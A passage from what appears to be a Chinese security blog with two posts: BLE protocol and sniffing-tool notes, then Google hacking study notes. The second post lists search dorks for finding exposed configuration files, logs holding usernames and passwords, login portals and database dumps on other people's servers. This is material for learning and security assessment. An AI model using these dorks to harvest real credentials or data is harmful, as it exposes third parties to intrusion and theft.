有效载荷内容的类型，通过这一字段确定改数据包是一个”通告”还是”扫描请求”或”响应”等 ​ ii. RFU 保留位 iii. TxAdd：发送地址字段 iv. RxAdd：接收地址字段 v. Payload Length：用来表示”有效载荷数据”(payload data)的长度，不包括头部内容 ii.数据报文（见协议BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.4） ​ ​ ​ 1.LLID（逻辑链路ID）：0x01表示该数据包是一个帧的延续内容，或者这是一个空的“逻辑链路控制及适配协议”数据包；0x02表示一个“逻辑链路控制及适配协议”数据包的开始；0x03表示这是一个“逻辑链路控制”数据包的内容 2.NESN：下一个期望的序列号，用于对接受到的数据包进行确认 3.MD：更多数据字段，主要是为了说明发送发是否还有要发给接收者的数据 4.RFU 保留位 5.Payload Length：用以表示包含”信息完整性校验码”（Message Integrity Check，MIC）在内的“有效载荷数据”的长度 4.CRC 3个字节长度，“循环冗余校验”（Cyclical Redundancy Check, CRC），可检查数据的正确性 0x06 BLE 协议栈BLE协议栈的结构图如下所示： ​ 各个结构简述： PHY：使蓝牙可以使用2.4GHz频道，并且能自适应的调频。 LL层：控制设备处于 准备、广播、监听、初始化、连接等5个状态 HCI层：向上为主机提供软件应用程序接口，对外为外部硬件提供控制接口 L2CAP层：对传输数据实行封装。 SM层：提供主机和客机的配对和密钥分发，实现安全连接和数据交换。 ATT层：对数据主机或客机传入的指令进行指令搜索处理 GATT层：接受和处理主机或客机传入的指令进行指令搜索处理 GAP层：向上提供API，向下合理分配各个层工作。 1. Physical Layer任何一个通信系统，首先要确定的就是通信介质(物理通道，Physical Channel)，BLE也不例外。在BLE协议中，”通信介质”的定义是由Physical Layer（其他通信协议也类似）负责。 Physical Layer是这样描述BLE的通信介质的： ​ 由于BLE属于无线通信，则其通信介质是实顶频率范围下的频率资源(Frequency Band) BLE的市场定位是个体和名用，因此使用免费的ISM频段(频率范围是2.400-2.4835Ghz) 为了同时支持多个设备，将真个频带分为40份，每份的宽带为2MHz，称作RF Channel 所以经过上面的定义之后，可以推测出BLE的物理通道，即“评到分别是’f=2402+k*2 MHz，k=0,…,39’,宽带为2MHz”的40个RFChannel。其中，有3个信道是advertising channel（广播通道），分别是37、38、39，用于发现设备（Scanning devices）、舒适化连接(initiating a connection)和广播数据(broadcasting date)；剩下的37个信道为data channel（数据通道），用于两个连接的设备间的通讯。 ​ 2. Link LayerLink Layer用于控制设备的射频状态，设备将处于Standby(待机)、Advertising（通告）、Scanning（扫描）、Initiating（初始化）、Connection（连接）这五种状态中的一种。 ​ 待机状态（Standby State）：此时即不发送数据，也不接受数据，对设备来说也是最节能的状态； 通告状态（Advertising State）：通告状态下的设备一般也被称为 “通告者”（Advertiser），它会通过advertising channel（广播通道）周期性的发送数据，广播的数据可以由处于Scanning state或Initiating state的实体接受； 扫描状态（Scanning State）：可以通过advertising channel（广播通道）接受数据的装填，该状态下的设备又被称为“扫描者”（Scanner）。此外，更具advertiser所广播的数据类型，有些Scanner还可以主动向Advertiser请求一些额外数据 初始化状态（Initiating State）：和Scanning State类似，不过是一种特殊的状态。Scanner会侦听所有的advertising channel，而Initator（初始化者）则只侦听某个特定设备的广播，并在接受到数据后，发送连接请求，以便和Advertiser建立连接 连接状态（Connection State）：由Initiating State或Advertising State自动切换而来，处于Connection State的双方，分别有两种角色。其中，Initiater方被称为Mater（主设备），Advertiser方则称作Slave（从设备）。 3. HCI主机控制接口层（Host Controller Interface，简写HCI）：定义Host（主机）和Controller（控制器）之间的通信协议，这一层可以是软件或者硬件接口，入UART、SPI、USB等 4. Generic Access Profile(GAP)前面Link Layer虽然对连接建立的过程做了定义，但它听没有体现到Application（或者 Profile）层面，而GAP则是直接与应用程序或配置文件通信的接口，它实现了如下功能： 定义GAP层的蓝牙设备角色（role） Broadcaster（广播者）：设备正在发送advertising events Obserber（观察者）：设备正在接受advertising events Peripheral（外设）：设备接受Link Layer连接（对应Link Layer的slave角色） Central（主机）：设备发起Link Layer连接（对应Link Layer的master角色） 定义GAP层的用于实现各种通信的操作模式（Operational Mode）和过程（Procedures） Broadcastmode and observation procedure，实现单向的、无连接的通信方式 Discovery modes and procedures，实现蓝牙设备的发现操作 Connection modes and procedures，实现蓝牙设备的连接操作 Bonding modes and procedures，实现蓝牙设备的配对操作 定义User Interface有关的蓝牙参数，包括蓝牙地址、蓝牙名称、蓝牙的PIN码等 Security相关的定义 5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）逻辑链路控制及自适应协议层（Logical Link Control and Adaptation Protocol）：为上层提供数据封装服务，允许逻辑上的点对点数据通信。 6. Security Manager（SM）Security Manager负责BLE通信中有关安全的内容，包括配对（pairing,）、认证（authentication）和加密（encryption）等过程。 7. Attribute protocol（ATT）在BLE协议栈中，Physical Layer负责提供一系列的Physical Channel；基于这些Physical Channel，Link Layer可在两个设备之间建立用于点对点通信的Logical Channel；而L2CAP则将这个Logical Channel换分为一个个的L2CAP Channel，以便提供应用程序级别的通道复用。到此之后，基本协议栈已经构建完毕，应用程序已经可以基于L2CAP欢快的run起来了。 谈起应用程序，就不得不说BLE的初衷——物联网。物联网中传输的数据和传统的互联网有什么区别呢？抛开其它不谈，物联网中最重要、最广泛的一类应用是：信息的采集。 这些信息往往都很简单，如温度、湿度、速度、位置信息、电量、水压、等等。 采集的过程也很简单，节点设备定时的向中心设备汇报信息数据，或者，中心设备在需要的时候主动查询。 基于信息采集的需求，BLE抽象出一个协议：Attribute protocol，该协议将这些“信息”以“Attribute（属性）”的形式抽象出来，并提供一些方法，供远端设备（remote device）读取、修改这些属性的值（Attribute value）。 Attribute Protocol的主要思路包括： 基于L2CAP，使用固定的Channel ID 采用client-server的形式。提供信息（以后都将其称为Attribute）的一方称作ATT server（一般是那些传感器节点），访问信息的一方称作ATT client。 一个Attribute由Attribute Type、Attribute Handle和Attribute Value组成。 Attribute Type用以标示Attribute的类型，类似于我们常说的“温度”、“湿度”等人类可识别的术语，通过UUID进行区分。 Attribute Handle是一个16-bit的数值，用作唯一识别Attribute server上的所有Attribute。Attribute Handle的存在有如下意义： 一个server上可能存在多个相同type的Attribute，显然，client有区分这些Attribute的需要。 同一类型的多个Attribute，可以组成一个Group，client可以通过这个Group中的起、始handle访问所有的Attributes。 Attribute Value代表Attribute的值，可以是任何固定长度或者可变长度的octet array。 Attribute能够定义一些权限（Permissions），以便server控制client的访问行为，包括： 访问有关的权限（access permissions），Readable、Writeable以及Readable and writable； 加密有关的权限（encryption permissions），Encryption required和No encryption required； 认证有关的权限（authentication permissions），Authentication Required和No Authentication Required； 授权有关的权限（authorization permissions），Authorization Required和No Authorization Required。 根据所定义的Attribute PDU的不同，client可以对server有多种访问方式，包括： Find Information，获取Attribute type和Attribute Handle的对应关系； Reading Attributes，有Read by type、Read by handle、Read by blob（只读取部分信息）、Read Multiple（读取多个handle的value）等方式； Writing Attributes，包括需要应答的writing、不需要应答的writing等。 8. Generic Attribute profile（ GATT）ATT之所以称作“protocol”，是因为它还比较抽象，仅仅定义了一套机制，允许client和server通过Attribute的形式共享信息。至于具体共享哪些信息，ATT并不关心，这是GATT（Generic Attribute Profile）的主场。GATT相对ATT只多了一个‘G‘，然含义却大不同，因为GATT是一个profile（更准确的说是profile framework）。 ​ 由上图可知，GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等，可参照官方Profiles Overview，对分析并无大用。 Service和Characteristic则是比较重要的，Service可以理解为PHP中的“类”、功能对象的集合。Characteristic可以理解为PHP的“函数”，是GATT中具体的功能对象，每个Service都可以包含一个或多个Characteristic（特征）。Characteristic是GATT profile中最基本的数据单位，由一个Properties、一个Value、一个或者多个Descriptor组成。 以上除“Profile”外的每一个定义，Service、Characteristic、Characteristic Properties、Characteristic Value、Characteristic Descriptor等等，都是作为一个Attribute存在的，具备前面所描述的Attribute的所有特征：Attribute Handle、Attribute Types、Attribute Value和Attribute Permissions。 在理解了GATT后，就已经能够分析或是“黑掉”一些BLE设备了。这里拿小米手环做例子，当LightBlue连上小米手环后，可以看到一个名为FEE7的UUID，如下所示： 其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表Characteristics搜索2A06，进入Characteristic的详情页面。 ​ ​ 其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表搜索2A06，进入Characteristic的详情页面。 ​ 于是，该Characteristic操作定义非常明确了。点击“Write new value”，可以写入新的值。若写入1或2，则可以引起手环的震动。 0x07 嗅探工具商业级的Ellisys BEX400侦听工具最为符合对BLE流量捕获及分析的要求，然而售价过于昂贵； 其次，作为开源硬件且配有混杂模式追踪的“超牙”设备——Ubertooth One拥有二次开发和嗅探已建立连接的蓝牙通信数据包的能力； 而淘宝购买的廉价CC2540开发板则作为最佳替补方案。 1. 低功耗蓝牙SOC低功耗蓝牙推出以来，众多厂商根据标准规范实现了不同的解决方案，包括TI的CC2540\\2541、北欧Nordic的nRF51822、CSR的1000\\1001、Quintic的QN9020\\9021（现在被NXP收购）、Broadcom的BCM20732等。其中，在开发者当中比较知名的是TI的CC254x系列和Nordic的NRF51822，并且这两款产品当有着自己的开发板和用于嗅探的调试工具。 a. CC2540德州仪器的CC2540，是一款高性价比、低功耗的片上系统（SOC）解决方案，适合蓝牙低功耗应用。它包含了一个8051内核的RF收发器，可编程闪存，8KB RAM和其他功能强大的配套特征及外设。CC2540有两种版本：CC2540F128 / F256，分别为128和256 KB的闪存，结合TI的低功耗蓝牙协议栈，CC2540F128 / F256形成了市场上最灵活，性价比也最高的单模式蓝牙BLE解决方案。CC2540 USB Dongle的实物图如下，它可以配合TI的PacketSniffer软件实现对BLE无线抓包： 实际上，任意包含CC2540芯片的开发板都能实现BLE流量嗅探的功能。不过，TI官方并没有将侦听BLE的源代码放出，仅提供了烧写到USB Dongle的固件 在这个基础上，如果想要实现更多的功能，比如监听指定范围内所有的低功耗蓝牙设备的流量，就有必要对其进行逆向或者自己完全重写个程序。。 b. NRF51822挪威Nordic Semiconductor（简称Nordic）公司的nRF51822，是一款多协议ARM内核蓝牙4.0低功耗/ 2.4GHz 专用RF的单芯片解决方案。它基于Cortex-M0 内核，配备16kB RAM，可编程闪存，提供128 KB和 256 KB Flash两种版本供用户选择。 nRF51822 USB Dongle及开发板套件如下所示： 刷入以下固件，配合官方的BLE sniffer程序，即可实现蓝牙流量的嗅探功能 不同与cc2540的Packet Sniffer，该程序无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪，并能够配合Wireshark解析BLE数据包，可以很直观的显示出内部的层级关系和各字段含义。比较遗憾的是，实际使用发现它并没有CC2540 USB Dongle稳定，经常会抓不到后面数据通信的网络包，不过这一问题应该是可以通过优化算法得到解决的，但需要对官方的固件进行逆向或自己根据Nordic公司提供的BLE协议栈重写代码。。 优点： 价格便宜，USB Dongle淘宝价70元左右，整套开发板售价约200软妹币上下 无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪 官方提供的BLE Sniffer程序可配合Wireshark工具对嗅探到的低功耗蓝牙数据包进行解析，能够很直观的显示出内部的层级关系和各字段含义 缺点： 不用指定广播信道，确实操作起来比较方便，但与之相对的是经常无法抓到后面的通信数据包。无论是作为开发用的调试工具，还是分析用的嗅探工具，都不够理想 2. 商业侦听工具a. Frontline BPA® 600Frontline Test Equipment——“前线测试设备”（简称“前线”，Frontline），主要是针对各种各样的协议所做的一个“协议分析器”。“前线”系统的销售策略是“卖硬件，送软件”，而软件自然是和硬件相关联的，其侦听范围包括SCADA系统、RS-232串口通信、Ethernet以太网通信、ZigBee网络通信，以及蓝牙网络技术。Frontline旗下的BPA® 600双模蓝牙协议分析仪，能够把从空中获取到的基础速率/ 增强数据速率（BR/EDR）的传统蓝牙无线通信和低功耗蓝牙无线通信数据同时直观的显示出来。 优点： 无角色指定链路抓取意味着在初始化设置时不再需要指定哪个设备是主设备（master），哪个设备是从设备（slave） 能够同时可视化的监视低功耗蓝牙技术所使用的三个广播信道 同时抓取和解密多条蓝牙链路 链路密钥可自动从第三方软件或调试工具导入到BPA 600 支持蓝牙SIG组织发布的所有的协议和应用层协议，完全支持蓝牙4.1版本 缺点： 十分昂贵，官网上虽并未公布具体的价格信息，需要与对方进行联系，但淘宝价格在15万左右 需要捕获到蓝牙的“连接建立”过程，对于已经建立好连接的蓝牙网络，无法从一个正在处理的进程中，嗅探到这个“微微网”里面的通信数据包 b. Ellisys BEX400Ellisys公司的BLuetooth Explorer 400（简称“BEX400”），是个独特的蓝牙数据通信捕获系统。它使用了一个wideband的接收器，能够同时侦听蓝牙整个79MHz的所有频谱。通过这种无线接入方法，嗅探蓝牙数据包以及对蓝牙活动的评估变得很容易。在BEX400强大的宽带接收能力支持下，我们能够同时捕获蓝牙的所有活动，且无需指定“蓝牙设备地址”信息。此外，该设备在捕获一个“微微网”中的蓝牙通信数据时，既可以是在连接建立前，也可以在连接建立后 优点： 对于BLE的流量捕获没有必须在建立连接前就开始嗅探的限制 能够同时侦听蓝牙的所有信道，且无需指定“蓝牙设备地址”信息 缺点： 价格极其昂贵 除价格外，几乎完全符合需求，暂未发现明显缺点 3. 开源侦听工具Ubertooth“超牙项目”（Project Ubertooth）是一个开源的硬件项目，由Great Scott Gadgets团队的Michael Ossmann开发。超牙的硬件系统，目前处于版本为1的阶段，称为“超牙一号”（Ubertooth One）。通过这个工具，可以创建属于自己的“传统蓝牙”和“低功耗蓝牙”底层通信数据包捕获工具。 此外，Ubertooth的固件源代码，可以直接从github：https://github.com/greatscottgadgets/ubertooth下载到最新的发布版。 优点： 售价约120美元，比较亲民 本身是一个开源的硬件和软件工程，其设计目的就是用来进行蓝牙网络的嗅探，便于研究员和黑客使用 针对不同的蓝牙规范，具有不同的应对工具，支持传统蓝牙和低功耗蓝牙两种数据包的捕获 能够在混杂模式下进行跟踪，通过ubertooth-btle程序对捕获的数据包进行识别和匹配，进而确定“访问地址”、“循环冗余校验”初始值、“跳转间隔”、“跳转增量”等，并还原出数据包的值 缺点： 说是支持“传统蓝牙”，但其实只能捕获“基本速率蓝牙”在网络中的活动，并不支持后来的“增强速率蓝牙”在规范改进后的设备。不过这与我们的工作没有太大联系，主要关注的应是低功耗蓝牙 0x08 移动端工具1. Android手机抓取app蓝牙数据a .Android蓝牙HCI日志在部分Android机型为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据，打开方式如下： 开发者模式→蓝牙HCI日志 不同的平台存放HCI log的路径会不一样，MTK存放HCI log的路径为/sdcard/mtklog/btlog/btsnoop_hci.log，高通的存放路径为/sdcard/btsnoop_hci.log 如果上面提到的路径下都没有HCI log，还可以通过手机上的蓝牙配置文件bt_stack.conf来查看路径 bt_stack.conf位于/etc/bluetooth/路径下，HCI log路径通过BtSnoopFileName=/sdcard/btsnoop_hci.log`来进行设置的 另外如果没有bt_stack.conf文件，设备也会在默认路径下生成日志：/data/misc/bluetooth/logs/btsnoop_hci.log 之后导出到wireshark查看即可，如图清晰的展示了蓝牙各协议栈的内容，分析时候重点关注发送的数据内容即Handle、uuid、Value等值即可 b. Bluez调试工具hcidump虽然Android 4.2已经将蓝牙协议栈替换为Bluedroid，但仍可使用BlueZ调试工具（需自行编译，或网上下载），且hcidump输出的数据与开发者模式里的蓝牙HCI日志基本一样，源码如下： https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1 hcidump抓取 log : 打开蓝牙 用adb shell 登陆android设备 并且用 hcidump -w /sdcard/hcilog 开始测试 测试完成，停止hcidump 导出到wireshark分析 hcilog 文件 2. 扫描器a. LightBlueLightBlue使用简单，打开蓝牙和app，即自动扫描蓝牙设备，未连接之前，大部分设备都是Unnamed和No services，选择其中一个会尝试连接，连接成功后即可获取蓝牙设备的设备信息、UUID、服务等信息了，选择其中一个服务，还可以尝试对其读写数据 b. nRF ConnectnRF Connect的使用方式和LightBlue基本一致，优点在于对设备服务信息展示更为直观： 0x09 针对利用蓝牙的应用攻击（私有协议）目前针对私有协议的分析基本都是通过蓝牙dongle抓包例如CC2540，并且逆向app进行分析应用实现是否安全。 YeeLight 2 代蓝牙灯泡，小爱爱智能跳蛋，小米手环 如何破解一个蓝牙锁 BLE安全入门及实战（1） BLE安全入门及实战（2） BLE安全入门及实战（3） 体脂秤 0x10 可以研究的点经过多年的历史发展，蓝牙本身已经变成一个比较复杂的协议了，如果需要整理完整的攻击面需要对整个蓝牙的实现有很清晰的梳理，网上大部分的文章都是关于协议本身的，对于协议的实现还是说的不是很清楚。而且协议本身的发展方向就是IOT方向，例如GATT这种很明显就是支持物联网设备的协议。所以搞清BLE5.0在真实的物联网设备上的架构以及实现我认为非常关键。 0x11 参考链接https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/ http://www.gandalf.site/2019/02/ble.html https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf http://drops.xmd5.com/static/drops/tips-10109.html https://blog.csdn.net/u013183495/article/details/51736605 https://www.secpulse.com/archives/75963.html 更新中…","link":"/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"},{"title":"Google hacking","text":"Google hacking ​ -ol4three 第一章 搜索基础知识 1.1Google搜索的黄金法则 Google限制搜索关键字最多为32个单词 Google查询是不区分大小写的： //or必须大写 Google的通配符 ： ***** Google保留忽略查询关键字的权利：Google会忽略一个搜索中的某些常用单词、字母和一些单独的数字。指出这些词汇常称为“停用词” 强制Google使用常见词汇的一种方法是把他们用引号引起来、或者在查询项之前加一个+号 1.2Google使用布尔操作符和特殊字符 AND ：这个操作符用于在查询中包含多个关键字 hacker and cracker (常用于防止过滤掉一些常用词) // + == “and justice for all” NOT ：这个操作符用于从查询中忽略一个关键字 hacker -golf ; hacker -phlegm (从你的查询中删除那些令人厌恶的字符) OR ：这个操作符命令Google查找搜索中的一个或者另外一个关键字 //可以用 “|” 或者 OR 来代替 查询看作是一个从左到右的句子即可 特殊字符： 特殊字符将被Google默认转化 1.3网站链接 www.google.com Google的主页，大部分搜索的入口 http://groups.google.com Google group页面 www.google.com/language/language_tools 各种语言和翻译选项 www.google.com/advance_search 高级搜索表单 www.google.com/preferences 使用偏好设置 第二章 高级搜索符 2.1简介 intitle,allintitle inurl,allinurl filetype allintext site link inanchor daterange cache info related phonebook rphonebook bphonebook author group msgid insubject stocks define 2.2操作符语法 在操作符、冒号、搜索关键字之间是没有空格的 如果用词组作为关键字的话，必须保证在操作符、冒号和词组的第一个引号之间没有任何空 格字符 高级操作符能够和单独的查询混合使用 2.3Google高级操作符 2.3.1 Intitle与Allintitle: 在页面标题中搜索 在页面标题中查找字符串 能够很好地和其他操作符混合使用 擅长搜索网页、Group、图片和新闻 allintetle 在页面中查找所有的关键字（不能和其他混合使用） 2.3.2 Allintext: 在网页内容中查找关键字 2.3.3 Inurl 与 Allinurl: 在URL中查找文本 在页面的URL中查找字符串 能够很好地和其他操作符混合使用 擅长搜索网页加图片 Allinurl 不能和其他操作符或者关键字混合使用 URL是统一资源定位符（简单来说它就是网页的地址） 2.3.4 Site： 搜索精确到特定的站点 允许你仅在某个特定的网站或者特定的网站或者特定的域中搜索网页 能够很好地和其他操作符或者关键字混合使用，也可以单独使用 擅长搜索网页，Group以及图片 Google搜索是从右向左读取服务器名的 2.3.5Filetype： 搜索指定类型的文件 根据文件扩展名查找特定的文件 等同于ext 需要附加搜索关键字 能够附加搜索关键字 能够很好地和其他操作符混合使用 2.3.6 Link： 搜索与当前网页存在链接的网页 搜索链接到一个网站或者URL的链接 不能很好地和其他操作符和和搜索关键字混合使用 删除搜索网页、图片和新闻。 必须提供一个完整的URL（包括协议、服务器、目录以及文件），或者一个部分URL 当你提交一个无效的Link 给Google 他会当成一个词组来处理 2.3.7 Inanchor：在链接文本中查找文本 在链接描述文本中查找文本 能够很好地和其他操作符和搜索关键字混合使用 擅长搜索网页、图片和新闻 可以和其他操作符及搜索关键字混合使用 2.3.8 Cache： 显示网页的缓存版本 显示页面的缓存版本 不能很好地和其他操作符或者关键字混合使用 擅长搜索网页 eg： cache: blackhat.org 2.3.9 Numerange： 搜索数字 在某一特定范围内查找数字 能够很好地和其他操作符或搜索关键字混合使用 擅长搜索网页 与ext同效 2.3.10 Daterange： 查找在某个特定日期范围内发布的网页 这个日期必须使用儒略历 deterange操作符必须和其他搜索关键字或高级操作符同时使用 2.3.11 Info： 显示Google的摘要信息 该操作符的参数必须是一个有效的URL或者网站名。、 info操作符不能和其他操作符或者搜索关键字混合使用 显示网页的摘要信息 2.3.12 Related： 显示相关站点 显示与“提交的网站或URL相关的” 站点 不能很多地和其他操作符或者关键字混合使用 擅长搜索网页 2.3.13 Author： 搜索Groups中新闻组帖子的作者 搜索Group帖子的作者 能够和其他混合使用 擅长搜索Group 2.3.14 Group： 搜索Group标题 2.3.15 Insubject： 搜索Google group主题行 在Group帖子的主题中查找字符串 能够很好地和其他操作符或搜索关键字混合使用 2.3.16 Msgid： 通过消息ID来查找Group帖子 不能很好的和其他操作符混合使用 2.3.17 Stocks： 搜索股票信息 2.3.18 Define： 显示某个术语的定义 显示对提供的单词或者词组的各种定义 不能很好地和其他操作符或者关键字混合使用 擅长搜索网页 2.3.19 Phonebook: 搜索电话列表 rphonebook 住宅电话列表 bphonebook 商业电话列表 phone book 商业和住宅电话列表 2.4操作符冲突与糟糕的Search-Fu ​ 2.5 网站链接 Google文件类型FAQ， www.google.com/help/faq_filetypes.html 文件扩展名信息资源，www.filext.com 这个网站能够帮助你找到某个特定的扩展名与何种程序相关联 http://searchenginewatch.com/searchday/article.php/20160061 这篇文章讨论了和Google日期限定搜索选项有关的话题 非常棒的在线Julian日期转换工具，www.24hourtranslations.co.uk/dates.htm和www.tesre.bo.cnr.it/~mauro/JD/ 第三章 Google hacking基础 3.1 简介 在浏览页面的缓存版本时。存在某种匿名隐藏的特征，来隐藏你的浏览行为 本章我们将了解一种遍历技术， 学习： 目录遍历、数字范围扩展以及扩展名搜索 3.2 使用缓存进行匿名浏览 Google会保存大部分他所抓取到的网页数据。虽然并不是都是如此而且这种情况也是可以防止的，但是大多数Google抓取的数据都被复制了一份，而且可以通过搜索结果页面的缓存链接来访问 www.phrack.org 点击缓存链接斌不是只从Google的数据库中加载网页，他还会连接到真是的服务器以访问图片以及其他非HTML内容 在缓存URL的尾部添加&amp;**strip=1将只显示缓存网页的文本。以这种范式访问缓存页面不会连接到网站的真实服务器，而且如果你使用的是本章中提到的剪切和粘贴的方法，还能够保护你的匿名性**。 tcpdump -n命令来抓捕这些数据 也可以使用服务器网站 eg：atomintersoft | samair.ru 3.3 目录列表 目录列表是一种能够列出网站服务器上存在的文件和目录的网页类型。 目录列表十分类似于FTP服务器 它们自身并不安全 它们显示出来的信息能够帮助攻击者了解网站服务器的某些特定技术细节 它们无法区分公开的文件和那些私有的文件 它们通常都是偶然显示出来的，这是因为许多网站服务器都是在顶层索引文件（index.htm、index.htm 、default.asp等）丢失或者无效的时候才会显示目录 3.3.1 查找目录列表 目录列表包含了大量很有价值的目录 最好的查找包含目录列表页面的方法是使用诸如intitle:index.of “parent directory” 或者 intitle:index.of name size之类的查询 3.3.2 查找特定的目录 你可以很容易地在目录列表中查找特定的目录，而只需要index.of查询上加一个目录名即可。例如，intitle:index.of inurl:backup可以用来查找URL中含有单词backup的目录列表。如果URL中含有单词backup，那么很有可能这是一个目录名 3.3.3 查找特定的文件 你可以很容易地在目录列表中查找特定的文件： 只需要简单地在index.of查询中加入文件名即可，例如intitle:index.of ws_ftp.log 3.3.4 服务器版本 某些服务器，尤其是Apache和Apache的派生服务器常常会在目录列表的底部加上一个服务器标志。这些服务器标志可以通过拓展index.of搜索来查找到，如intitle:index.of server.at 你也可以搜索特定版本的web服务器，这是通过添加一个正确格式的服务器标志来实现的。例如， intitle:index.of server.at “Apache Tomcat/“ 能够找到运行各种版本的Apache Tomcat服务其的网站（同样的nmap也可以来识别） 3.4 险境：遍历技术 3.4.1 目录遍历 一旦你在服务器上找到了某个特定的目录，就可以使用这个技术来查找其他的目录或者子目录 完成这种任务的一个简单的办法就是利用目录列表。只要点击parent directory链接，就可以进入当前目录的上一级目录。如果该父目录仍包含其他的目录列表，那么你可以通过点击其链接来挖掘其他的目录。如果父目录没有显示目录列表，那么你可能就需要诉诸于一种更为复杂的方法了。即猜测目录名并把他们添加到父目录的URL的尾部。或者，考虑在Google搜索中使用site和Inurl关键词 3.4.2 递增置换 递增置换是 “取一个数并用下一个更大的或者更小的数来代替这个数” 的形象的说法 这个技术可以用于挖掘在目录名或者文件名中使用数字的站点。这种技术只需要用更大的或者更小的数来替代原来的数字，但是要注意保持文件名或者目录名中剩下的部分不变（注意那些零）。或者，在Google搜索中使用site，在加上inurl或者filetype关键字。 3.4.3 拓展遍历 这种技术可以用于查找文件名相同，而扩展名不同的文件（例如备份文件） 实现拓展遍历技术最容易的方法是在URL中，用一种扩展名来替代另一种扩展名，例如，用bak代替html 目录列表，尤其是缓存目录列表，是最容易判定备份文件是否存在的方法，也能够判定可能用于网站其他部分的扩展名 3.5 网站链接 www.all-nettools.com/pr.htm 一个简便的代理检查工具，它能够帮助你测试正在使用的代理服务器 http://www.sensepost.com/research/wikto Sensepost的Wikto工具，一个很强大的web扫描工具，它还结合了使用Google hacking数据库的Google查询测试。 一个简单的Google搜索可以用来在不对站点管理员或侵入检测系统，并且搜集到的信息都可以在以后的评估中重复使用。 第四章 文档加工和数据库挖掘 4.1 简介 互联网上的文档都是有价值的。“好人”和“坏人”都可以利用在文档中的信息来达到他们各自的目的 这章我们就来学习一下关于文档的挖掘 4.2 配置文件 4.2.1 基本信息： 配置文件能够向攻击者泄露敏感的信息 尽管配置文件的文件名不同，但是仍可以通过文件的扩展名来找到配置的文件，例如INI、CONF、CONFIG、或CFG 配置文件存储了程序的设置和程序的用法 对于配置文件来说攻击者可以根据其提供的各种信息来寻找相应的方法甚至继续在寻找更深的东西出来 对于搜索文件来说最好尝试用不同类型的搜索方法 eg:intitle:index.of ws_ftp.ini | filetype:ini inurl:ws_ftp.ini 都可以找到一些东西 eg： filetype:conf inurl: firlwall 它可以搜索出防火墙的配置文件 eg： (inurl:conf OR inurl:config OR inurl:cfg)使用这样的联合搜索 正如一个攻击者知道你的配置文件的名称就可以通过filetype inutl 来更准确的寻找需要的文件 4.2.2 对于一个Google黑客在搜索配置文件是应该注意的一些东西： 使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索 过滤掉sample example test howto tutorial单词以剔除明显的实例文件 用-cvs过滤掉CVS存储器，他们通常存放了默认的配置文件 如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual 搜索实例配置文件中最长改变的域，并且对该与执行缩简搜索、以提出可能的样例文件 4.2.3 配置文件搜索实例： ​ ​ 4.3 日志文件 日志文件记录了一些信息 甚至包括一些时间和 IP地址到用户名与口令 例如银行卡账号 filetype:log inurl: log 或者是更简单的ext:log log 下面列出一些日志文件搜索实例 ​ ​ filetype:log username putty 下图为搜索的结果该结果也可以在下一次继续使用 ​ 一些较为敏感的office文档： ​ ​ 4.4 数据库挖掘 登陆入口，尤其是软件制造商提供的默认入口，是可以很容易就搜索到的 eg：login welcome copyright statements 位于服务器端和客户端的软件都有帮助文件， 这些文件会泄露关于应用程序配置和用法的信息 不同的错误消息的内容都能用来剖析目标 数据库转储已证明是所有数据库的发现中泄露信息最多的，因为他们包括完整的或者部分的数据哭内容，可以通过数据库转储的头部字符搜索来得到， eg: “#Dumping data for table” 4.4.1 登陆入口： 搜索登陆入口 eg: inurl: admin | login 等 下面是一些搜索的例子 ​ ​ 4.4.2 帮助文件 其可能泄露机器名，用户名和明文口令 下面是一些帮助文件的搜索 ​ ​ 4.4.3 错误信息： 错误信息会泄露更多关于服务器上可能存在的漏洞的危险信息 ​ ​ ​ ​ 4.4.4 数据库转储： 数据库的任意格式的输出都可以看做是数据库的转储 它可以泄露出很多信息 ​ 4.4.5 实际的数据库文件： 对于数据库存储文件来说 Google只适用于用一个特定的文件名或扩展名的文件来表示数据库 ​ ​ 4.6 网站链接： www.filext.com 一个关于文件扩展名信息的不错的资源。 http://desktop.google.com Google桌面搜索应用程序 http”//johnny.ihackstuff.com Google hacking数据库的主页，在其中你可以找到更多的和本章中列出的那些搜索相近的搜索 4.7 一些感想 如果防止下载 .INC文件或者将扩展名改为.PHP 隐藏其中的内容 如果想要防止这方面的信息泄露，应该模拟一次信息的渗透测试来修改你不希望的出现的东西，甚至可以放一些文件来误导攻击者 对于附录网站敏感信息或者绝对路径的文件，应该放在一些无法read的目录或隐藏 第五章 Google在信息收集框架中扮演的角色 5.1 简介 黑客实际上是一种心境以及一种思考方式，而不是一种物理属性 因为他们想了解大多数人所不了解的 知识就是力量 5.2 自动搜索原则 确定原始搜索关键字 扩展 搜索关键字 从数据源获取数据 解析数据 在后期过程中，将数据处理为信息 5.2.1 原始搜索关键字 清晰的定义目标大概算是所有搜索中最不相同的部分了，好的搜索不可能得到一个不清晰的目标。在进行自动化搜索时，手动搜索中的原则也同样适用：无用的信息输入，无用信息输出。 5.2.2 扩展搜索关键字 